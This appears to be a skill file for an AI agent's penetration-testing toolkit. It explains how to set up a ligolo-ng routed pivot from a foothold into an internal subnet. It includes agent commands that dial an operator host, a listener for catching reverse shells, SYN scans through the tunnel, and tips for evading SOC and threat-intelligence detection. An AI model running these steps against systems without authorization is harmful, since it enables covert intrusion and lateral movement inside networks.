---
name: ligolo-ng
description: "Build a routed pivot with ligolo-ng: a TLS agent on the foothold connects out to ligolo-proxy, which creates a TUN interface and kernel routes so any tool reaches the internal network without proxychains. Use when a pivot must carry SYN scans, UDP, ICMP or tools with no SOCKS support. Not for a quick single-port tunnel (use chisel) and not for proxying existing tool traffic (use proxychains)."
---

# ligolo-ng

ligolo-ng is a reverse-tunnel pivot with a real network interface. The agent only makes an outbound TLS connection; the proxy multiplexes those streams into a TUN device, and the operating system routes the internal subnet through it. Every tool behaves as if it were on the segment: no SOCKS wrapper, no TCP-only limit.

The proxy CLI is its own shell with a command tree (`session`, `interface_create`, `route_add`, `tunnel_start`, `listener_add`). This host ships a dev build that reports `dev / none / unknown`, so trust the built-in `help` output over any documentation.

## When to use

| Goal | Command path | Note |
| --- | --- | --- |
| Reach an internal /24 with any tool | `interface_create` + `route_add` + `tunnel_start` | manual, explicit, auditable |
| Same, in one step | `autoroute` | prompts per interface, creates routes and starts the tunnel |
| SYN scan or UDP scan through the pivot | routed TUN | the whole reason to prefer this over SOCKS |
| Catch a reverse shell from the internal net | `listener_add` | agent listens, you receive |
| Multiple agents at once | `session` | one tunnel per agent, switch with `session` |
| Target cannot dial out | agent `-bind` + proxy `connect_agent` | bind mode, then the proxy dials in |

If the tool already speaks SOCKS or you only need one port, chisel is smaller and leaves less state.

## Prerequisites

- Binaries: `/opt/tools/ligolo-proxy`, `/opt/tools/ligolo-agent`, `/opt/windows-tools/ligolo-agent.exe`.
- Root or `CAP_NET_ADMIN` on the proxy host: creating a TUN interface needs it.
- Outbound TCP from the target to the proxy port (default `11601`). No root on the target.
- The proxy is a CLI, so run it inside `tmux`; closing the terminal kills the tunnels.
- A config file named `ligolo-ng.yaml` in the working directory is loaded automatically (observed at startup: `Loading configuration file ligolo-ng.yaml`). Keep that in mind when the proxy starts with unexpected settings.

## Core invocations

```sh
# 1. Start the proxy with a throwaway self-signed certificate
/opt/tools/ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2. Same, without the banner; -v adds verbose logging
/opt/tools/ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -nobanner -v

# 3. Print the SHA256 fingerprint inside the proxy CLI, then hand it to agents
#    proxy> certificate_fingerprint

# 4. Agent on the foothold, pinned to the proxy certificate
/opt/tools/ligolo-agent -connect 10.10.14.5:11601 -accept-fingerprint "$FP"

# 5. Agent trusting any certificate - lab only, MITM-able
/opt/tools/ligolo-agent -connect 10.10.14.5:11601 -ignore-cert

# 6. Agent over an HTTP/SOCKS proxy the target already uses
/opt/tools/ligolo-agent -connect 10.10.14.5:11601 -ignore-cert -proxy socks5://127.0.0.1:1080

# 7. Bind mode when the target cannot reach you, then dial in from the proxy
/opt/tools/ligolo-agent -bind 0.0.0.0:11601 -ignore-cert
#    proxy> connect_agent --ip 10.0.0.20:11601 --ignore-cert

# 8. Select the agent, then look at the networks it can see
#    proxy> session
#    proxy> ifconfig

# 9. Create the TUN interface (alias: ifcreate), default name is generated if omitted
#    proxy> interface_create --name ligolo

# 10. Route the internal subnet through it (alias: add_route / interface_add_route)
#    proxy> route_add --name ligolo --route 10.10.20.0/24

# 11. Start relaying (alias: start); the TUN name must match
#    proxy> tunnel_start --tun ligolo

# 12. One-shot version of 9-11, plus IPv6 routes
#    proxy> autoroute --interface ligolo --with-ipv6

# 13. Agent-side listener: target listens on 4444, traffic lands on your 127.0.0.1:4444
#    proxy> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# 14. UDP listener (DNS, SNMP, syslog) instead of TCP
#    proxy> listener_add --addr 0.0.0.0:5353 --to 127.0.0.1:5353 --udp

# 15. Teardown in order: stop the tunnel, kill the agent, drop the interface
#    proxy> tunnel_stop
#    proxy> kill
#    proxy> interface_delete --name ligolo
```

## Flags that matter

| Flag | Side | Effect |
| --- | --- | --- |
| `-selfcert` | proxy | generate a self-signed certificate at startup; default domain `ligolo` |
| `-selfcert-domain` / `-selfcert-cache` | proxy | change the CN and where the certificate is cached |
| `-laddr` | proxy | listen address, default `0.0.0.0:11601`; `http(s)://` prefix selects WebSocket |
| `-certfile` / `-keyfile` | proxy | real TLS certificate instead of self-signed (`certs/cert.pem`, `certs/key.pem`) |
| `-config` | proxy | alternate config file; otherwise `ligolo-ng.yaml` in the cwd |
| `-daemon` | proxy | no CLI, runs as a daemon |
| `-api-laddr` | proxy | REST API address, default `127.0.0.1:8080` |
| `-max-inflight` | proxy | concurrent connection requests per tunnel, default 4096 |
| `-connect` | agent | proxy `host:port` to dial |
| `-accept-fingerprint` | agent | pin the proxy certificate by SHA256 hex |
| `-ignore-cert` | agent | accept any certificate; documented as debug-only |
| `-retry` / `-retry-delay` | agent | retry the first connection (5s default delay) |
| `-reconnect` / `-reconnect-delay` / `-reconnect-timeout` | agent | reconnection after loss, on by default, 20s delay, 300s budget |
| `-ua` | agent | HTTP User-Agent, defaults to a Chrome 103 string |
| `-bind` | agent | listen instead of dial; pairs with `connect_agent` |

## Workflow

1. **Start the proxy** under `tmux` with `-selfcert` and note the fingerprint.
2. **Drop the agent** on the foothold and start it with `-connect` plus `-accept-fingerprint`. Use the default `-ua` unless the environment fingerprints it.
3. **Select the session** in the proxy CLI (`session`) and confirm the agent identity.
4. **Map the agent's networks** with `ifconfig` before creating anything. Route only the subnets you need.
5. **Create the interface** (`interface_create --name ligolo`), then add each route (`route_add --name ligolo --route <cidr>`).
6. **Start the tunnel** (`tunnel_start --tun ligolo`) and verify with `ip route`, then `nmap -Pn -sS` against one host.
7. **Use `listener_add`** when the internal host must connect to you, rather than punching a route back.
8. **Tear down explicitly**: `tunnel_stop`, `kill`, `interface_delete`. Do not leave TUN devices or routes behind.

## OPSEC and telemetry

- The agent makes one outbound TLS connection and reconnects by default. There is no listening port on the target and no service installed.
- The default self-signed certificate uses the CN `ligolo`; the proxy itself warns: `Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!`. Change `-selfcert-domain` or use a real certificate for anything beyond a lab.
- The default agent User-Agent is a Chrome 103 string, which mismatches the TLS fingerprint of a Go binary. Consider matching a real browser certificate or fronting the proxy behind a normal web server.
- Routed traffic is generated by your kernel: source IPs, TTLs and scan patterns look like a real host on the segment, which is exactly the trade-off - `nmap -sS` arrives as a SYN scan from your box.
- Connections to a `listener_add` port arrive at the agent host and are carried out through the tunnel, so target-side logs show the internal peer, not your address. That makes the agent host the apparent server.
- Every session is visible in the proxy CLI and, if enabled, in the web UI (`web.*` config, default disabled). The proxy's readline history is written to `ligolo-ng.history` by default.
- The binary is public and signatured. Renaming hides filenames only.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| Agent prints a TLS error and exits | `-selfcert` rotated, fingerprint changed | re-read `certificate_fingerprint`, restart agent with the new pin |
| Agent connects but `session` shows nothing | wrong proxy port or agent crashed on start | run the agent with `-v`, confirm `ss -lntp` on the proxy |
| `interface_create` fails with permission denied | no `CAP_NET_ADMIN` | run the proxy as root |
| Routes exist but traffic does not flow | tunnel not started, or route added to the wrong interface | `tunnel_list`, then `tunnel_start --tun <name>` |
| `route_add` refuses the CIDR | interface name typo or route overlaps an existing one | `interface_list`, then re-add with the printed name |
| Tools still go out the default route | route more specific than the interface, or a VPN holds the prefix | `ip route get 10.10.20.5` and adjust metric/prefix |
| `listener_add` binds but nothing arrives | agent-side port already in use or firewall on the target | pick another `--addr`, check on the agent with `-v` |
| `autoroute` hangs on a prompt | it is interactive per interface | use `--interface <name>` to skip the prompt |
| Tunnel dies when the terminal closes | the proxy is a foreground CLI | run it in `tmux`/`screen`, or use `-daemon` |

## Verification

```sh
/opt/tools/ligolo-proxy -version                 # this dev build prints: Ligolo-ng dev / none / unknown
/opt/tools/ligolo-agent -version                 # same banner
# after tunnel_start:
ip link show ligolo                              # expect: <POINTOPOINT,MULTICAST,NOARP,UP>
ip route show | grep 10.10.20                    # expect: 10.10.20.0/24 dev ligolo
ping -c1 10.10.20.5                              # routed pivot answers ICMP, SOCKS pivots cannot
nmap -Pn -sS -p445 10.10.20.5                    # expect: 445/tcp open
# in the proxy CLI:
#   tunnel_list    -> one tunnel, agent name, interface
#   ifconfig       -> agent interfaces and routes
```

Keep `tunnel_list` output and the `ip route` snippet as evidence that traffic used the pivot rather than the local network.

## Related skills

- [chisel](../chisel/SKILL.md) for a lighter HTTP tunnel or a single SOCKS listener
- [proxychains](../proxychains/SKILL.md) when no TUN device is available
- [nmap](../nmap/SKILL.md) for scanning through the routed interface
- [metasploit](../metasploit/SKILL.md) for sessions carried over the pivot
- [toolchain-router](../toolchain-router/SKILL.md) to confirm a routed pivot is required